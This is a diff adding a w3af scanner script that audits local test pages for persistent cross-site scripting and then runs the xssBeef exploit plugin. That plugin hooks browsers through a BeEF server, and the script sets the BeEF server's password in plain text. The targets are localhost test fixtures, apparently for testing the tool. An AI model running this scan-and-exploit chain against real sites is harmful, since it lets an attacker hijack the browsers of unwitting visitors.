@@ -1,0 +1,29 @@
+# permanent xss exploit using beef
+
+plugins
+output console,textFile
+output
+output config textFile
+set fileName output-w3af.txt
+set verbosity 10
+back
+output config console
+set verbosity 0
+back
+output
+audit xss
+back
+
+target
+set target http://localhost/w3af/permanent-xss/test-permanentxss-reader.php?a=f00, http://localhost/w3af/permanent-xss/test-permanentxss-writer.php?a=g99&b=00
+back
+
+start
+
+exploit
+exploit config xssBeef
+set beefURL http://localhost/beef/
+set beefPasswd beEFconfigPass
+view
+back
+exploit xssBeef
